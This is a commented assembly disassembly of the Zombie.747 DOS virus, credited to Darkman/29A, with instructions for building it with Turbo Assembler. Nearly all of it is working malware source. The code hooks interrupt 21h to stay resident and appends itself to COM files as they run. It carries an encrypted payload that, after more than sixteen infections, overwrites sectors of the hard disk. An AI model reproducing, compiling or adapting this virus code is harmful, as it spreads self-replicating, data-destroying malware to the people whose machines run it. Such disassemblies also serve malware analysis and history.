Zombie


Disassembly by Darkman/29A 
  Zombie.747 is a 747 bytes parasitic resident COM virus. Infects files at 
  load and execute program, except COMMAND.COM, by appending the virus to the 
  infected COM file. 
  To compile Zombie.747 with Turbo Assembler v 4.0 type: 
TASM /M ZOMBI747.ASM 
TLINK /t /x ZOMBI747.OBJ 


.model tiny 
.code 
 org   100h     ; Origin of Zombie.747 
code_begin: 
      call    crypt_virus 
      nop 
      nop 
      nop 
      nop 
      nop 
virus_begin: 
      call    delta_offset 
delta_offset: 
      pop     bp    ; Load BP from stack 
      sub     bp,03h   ; BP = delta offset 
      jmp     virus_begin_ 
stack_end: 
stack_      db      7ah dup(?)   ; Stack 
stack_begin: 
int21_addr   dd      ?    ; Address of interrupt 21h 
virus_seg    dw      ?    ; Segment of virus 
stack_seg    dw      ?    ; Stack segment 
stack_ptr    dw      ?    ; Stack pointer 
infect_off   dw      offset infect_file-offset virus_begin 
infect_mark  db      04h dup(?)   ; infection mark 
infect_count dw      ?    ; Infection counter 
virus_offset equ     word ptr $+01h  ; Offset of virus 
infect_code  db      0e9h,?,?   ; JMP imm16 (opcode 0e9h) 
origin_code  db      0cdh,20h,?   ; Original code of infected file 
code_begin_  dw      100h   ; Offset of beginning of code 
int21_virus  proc    near   ; Interrupt 21h of Zombie.747 
      pushf    ; Save flags at stack 
      cmp     ax,4b00h   ; Load and execute program? 
      je      load_and_exe  ; Equal? Jump to load_and_exe 
      cmp     ax,4b69h   ; Zombie.747 function? 
      je      virus_functi  ; Equal? Jump to virus_functi 
      popf    ; Load flags from stack 
      jmp     dword ptr cs:[offset int21_addr-offset virus_begin] 
      endp 
virus_functi: 
      mov     bx,ax   ; Already resident 
      popf    ; Load flags from stack 
      iret    ; Interrupt return! 
load_and_exe: 
      mov     cs:[offset infect_off-offset virus_begin],offset infect_file-offset virus_begin 
      call    setup_stack 
      popf    ; Load flags from stack 
      jmp     dword ptr cs:[offset int21_addr-offset virus_begin] 
setup_stack  proc    near   ; Setup stack of the virus 
      mov     cs:[offset stack_seg-offset virus_begin],ss 
      mov     cs:[offset stack_ptr-offset virus_begin],sp 
      mov     ss,cs:[offset virus_seg-offset virus_begin] 
      mov     sp,offset stack_begin-offset virus_begin 
      push    ax bx cx dx es ds si di bp 
      call    cs:[offset infect_off-offset virus_begin] 
      cmp     word ptr cs:[offset infect_count-offset virus_begin],10h 
      jbe     load_stack   ; Below or equal? Jump to load_stack 
      call    payload 
load_stack: 
      pop     bp di si ds es dx cx bx ax 
      mov     ss,cs:[offset stack_seg-offset virus_begin] 
      mov     sp,cs:[offset stack_ptr-offset virus_begin] 
      ret    ; Return! 
      endp 
payload      proc    near   ; Payload of the virus 
      mov     si,offset crypt_begin-offset virus_begin 
      mov     cx,(crypt_end-crypt_begin) 
decrypt_loop: 
      not     byte ptr [si]  ; Decrypt a byte 
      inc     si    ; Increase index register 
      loop    decrypt_loop 
crypt_begin: 
      mov     ax,303h   ; Write disk sector(s) 
      db      31h,0dbh   ; XOR BX,BX 
      mov     es,bx   ; ES:BX = pointer to data buffer 
      mov     cx,02h   ; CX = sector- and cylinder number 
      mov     dx,80h   ; DX = drive- and head number 
      int     13h 
crypt_end: 
      mov     si,offset crypt_begin-offset virus_begin 
      mov     cx,(crypt_end-crypt_begin) 
encrypt_loop: 
      not     byte ptr [si]  ; Encrypt a byte 
      inc     si    ; Increase index register 
      loop    encrypt_loop 
      ret    ; Return! 
      endp 
examine_file proc    near   ; Examine file 
      cld    ; Clear direction flag 
find_dot: 
      lodsb    ; AL = byte of filename 
      cmp     al,'.'              ; Found the dot in the filename 
      je      examine_fil_  ; Equal? Jump to examine_fil_ 
      or      al,al   ; End of filename? 
      loopnz  find_dot   ; Not zero? Jump to find_dot 
      jz      examine_exit  ; Zero? Jump to examine_exit 
examine_fil_: 
      mov     ax,[si-06h]  ; AX = word of filename 
      or      ax,2020h   ; Lowcase word of filename 
      cmp     ax,'mm'             ; COMMAND.COM? 
      je      examine_exit  ; Equal? Jump to examine_exit 
      lodsw    ; AX = word of extension 
      or      ax,2020h   ; Lowcase word of extension 
      cmp     ax,'oc'             ; Correct extension? 
      jne     examine_exit  ; Not equal? Jump to examine_exit 
      lodsb    ; AL = byte of extension 
      or      al,20h   ; Lowcase byte of extension 
      cmp     al,'m'              ; Correct extension? 
      jne     examine_exit  ; Not equal? Jump to examine_exit 
      clc    ; Clear carry flag 
      ret    ; Return! 
examine_exit: 
      stc    ; Set carry flag 
      ret    ; Return! 
      endp 
set_file_pos proc    near   ; Set current file position 
      xor     cx,cx   ; Zero CX 
      or      dx,dx   ; Zero DX? 
      jns     set_file_po_  ; Positive? Jump to set_file_po_ 
      not     cx    ; Invert each bit of low-order wor... 
set_file_po_: 
      mov     ah,42h   ; Set current file position 
      int     21h 
      ret    ; Return! 
      endp 
infect_file  proc    near   ; Infect COM file 
      mov     si,dx   ; SI = offset of filename 
      call    examine_file 
      jnc     open_file   ; No error? Jump to open_file 
      jmp     infect_exit_ 
open_file: 
      mov     ax,3d02h   ; Open file (read/write) 
      int     21h 
      jnc     read_file   ; No error? Jump to read_file 
      jmp     infect_exit_ 
read_file: 
      mov     bx,ax   ; BX = file handle 
      mov     dx,cs   ; DX = code segment 
      mov     ds,dx   ; DS "  "      " 
      mov     ah,3fh   ; Read from file 
      mov     cx,03h   ; Read three bytes 
      mov     dx,offset origin_code-offset virus_begin 
      int     21h 
      jnc     examine_mark  ; No error? Jump to examine_mark 
      jmp     close_file 
examine_mark: 
      mov     dx,-28h   ; DX = low-order word of offset fr... 
      mov     al,02h   ; Set current file position (EOF) 
      call    set_file_pos 
      jc      close_file   ; Error? Jump to close_file 
      nop 
      nop 
      nop 
      mov     ah,3fh   ; Read from file 
      mov     cx,04h   ; Read four bytes 
      mov     dx,offset infect_mark-offset virus_begin 
      int     21h 
      jc      close_file   ; Error? Jump to close_file 
      nop 
      nop 
      nop 
      cmp     word ptr ds:[offset infect_mark-offset virus_begin],'oZ' 
      jne     calc_offset  ; Not equal? Jump to calc_offset 
      nop 
      nop 
      nop 
      cmp     word ptr ds:[offset infect_mark+02h-offset virus_begin],'bm' 
      je      close_file   ; Previosly infected? Jump to clos... 
      nop 
      nop 
      nop 
calc_offset: 
      xor     dx,dx   ; Zero DX 
      mov     al,02h   ; Set current file position (EOF) 
      call    set_file_pos 
      jc      close_file   ; Error? Jump to close_file 
      nop 
      nop 
      nop 
      sub     ax,03h   ; AX = offset of virus 
      mov     ds:[offset virus_offset-offset virus_begin],ax 
      mov     ax,5700h   ; Get file's date and time 
      int     21h 
      push    cx dx   ; Save registers at stack 
      mov     ah,40h   ; Write to file 
      mov     cx,(code_end-virus_begin) 
      xor     dx,dx   ; Zero DX 
      int     21h 
      jc      infect_exit  ; Error? Jump to infect_exit 
      nop 
      nop 
      nop 
      cmp     cx,ax   ; Written all of the virus? 
      jne     infect_exit  ; Not equal? Jump to infect_exit 
      nop 
      nop 
      nop 
      mov     al,00h   ; Set current file position (SOF) 
      xor     dx,dx   ; Zero DX 
      call    set_file_pos 
      jc      infect_exit  ; Error? Jump to infect_exit 
      nop 
      nop 
      nop 
      mov     ah,40h   ; Write to file 
      mov     cx,03h   ; Write three bytes 
      mov     dx,offset infect_code-offset virus_begin 
      int     21h 
      jc      infect_exit  ; Error? Jump to infect_exit 
      nop 
      nop 
      nop 
infect_exit: 
      inc     word ptr cs:[offset infect_count-offset virus_begin] 
      mov     ax,5701h   ; Set file's date and time 
      pop     dx cx   ; Load registers from stack 
      int     21h 
close_file: 
      mov     ah,3eh   ; Close file 
      int     21h 
infect_exit_: 
      ret    ; Return! 
      endp 
get_psp_own  proc    near   ; Get PSP segment of owner or spec... 
      mov     ah,52h   ; Get list of lists 
      int     21h 
      mov     bx,es:[bx-02h]  ; BX = segment of first memory con... 
      mov     es,bx   ; ES =    "    "    "     "      " 
      mov     bx,es:[01h]  ; BX = PSP segment of owner or spe... 
      ret    ; Return! 
      endp 
allocate_mem proc    near   ; Allocate memory 
      push    es    ; Save ES at stack 
      mov     ax,cs   ; AX = segment of PSP for current ... 
      dec     ax    ; AX = segment of Memory Control B... 
      mov     es, ax   ; ES =    "    "    "       "     " 
      mov     bx,es:[03h]  ; BX = size of memory block in par... 
      pop     es    ; Load ES from stack 
      sub     bx,cx   ; Subtract number of paragraphs to... 
      dec     bx    ; BX = new size in paragraphs 
      mov     ah,4ah   ; Resize memory block 
      int     21h 
      jc      allocat_exit  ; Error? Jump to allocat_exit 
      nop 
      nop 
      nop 
      mov     ah,48h   ; Allocate memory 
      mov     bx,cx   ; BX = number of paragraphs to all... 
      int     21h 
      jc      allocat_exit  ; Error? Jump to allocat_exit 
      nop 
      nop 
      nop 
      push    ax    ; Save AX at stack 
      dec     ax    ; AX = segment of Memory Control B... 
      mov     es,ax   ; ES =    "    "    "       "     " 
      push    es    ; Save ES at stack 
      call    get_psp_own 
      pop     es    ; Load ES from stack 
      mov     es:[01h],bx  ; Store PSP segment of owner or sp... 
      pop     es    ; Load ES from stack 
      clc    ; Clear carry flag 
allocat_exit: 
      ret    ; Return! 
      endp 
virus_begin_: 
      mov     ax,4b69h   ; Zombie.747 function 
      xor     bx,bx   ; Zero BX 
      int     21h 
      cmp     bx,4b69h   ; Already resident? 
      je      virus_exit   ; Equal? Jump to virus_exit 
      nop 
      nop 
      nop 
      mov     cx,(data_end-virus_begin+0fh)/10h 
      call    allocate_mem 
      jc      virus_exit   ; Error? Jump to virus_exit 
      nop 
      nop 
      nop 
      mov     si,bp   ; SI = delta offset 
      xor     di,di   ; Zero DI 
      mov     cx,(code_end-virus_begin) 
      cld    ; Clear direction flag 
      rep     movsb   ; Move virus to top of memory 
      mov     es:[offset virus_seg-offset virus_begin],es 
      push    es    ; Save ES at stack 
      mov     ax,3521h   ; Get interrupt vector 21h 
      int     21h 
      mov     dx,es   ; DX = segment of interrupt 21h 
      pop     es    ; Load ES from stack 
      mov     word ptr es:[offset int21_addr-offset virus_begin],bx 
      mov     word ptr es:[offset int21_addr+02h-offset virus_begin],dx 
      mov     ax,2521h   ; Set interrupt vector 21h 
      push    es    ; Save ES at stack 
      pop     ds    ; Load DS from stack (ES) 
      mov     dx,offset int21_virus-offset virus_begin 
      int     21h 
virus_exit: 
      mov     ax,cs   ; AX = segment of PSP for current ... 
      mov     ds,ax   ; DS =    "    "   "   "     "     " 
      mov     es,ax   ; ES =    "    "   "   "     "     " 
      lea     si,origin_code  ; SI = offset of origin_code 
      sub     si,offset virus_begin 
      add     si,bp   ; Add delta offset to offset of co... 
      mov     di,100h   ; DI = offset of beginning of code 
      mov     cx,03h   ; Move three bytes 
      cld    ; Clear direction flag 
      rep     movsb   ; Move the original code to beginning 
      lea     bx,code_begin_  ; BX = offset of code_begin_ 
      sub     bx,offset virus_begin 
      add     bx,bp   ; Add delta offset to offset of co... 
      jmp     [bx] 
      db      'Zombie - Danish woodoo hackers (14AUG91)' 
code_end: 
data_end: 
crypt_virus  proc    ; Encrypt payload of the virus 
      lea     si,crypt_begin  ; SI = offset of crypt_begin 
      mov     cx,(crypt_end-crypt_begin) 
crypt_loop: 
      not     byte ptr [si]  ; Encrypt a byte 
      inc     si    ; Increase index register 
      loop    crypt_loop 
      ret    ; Return! 
      endp 
end      code_begin 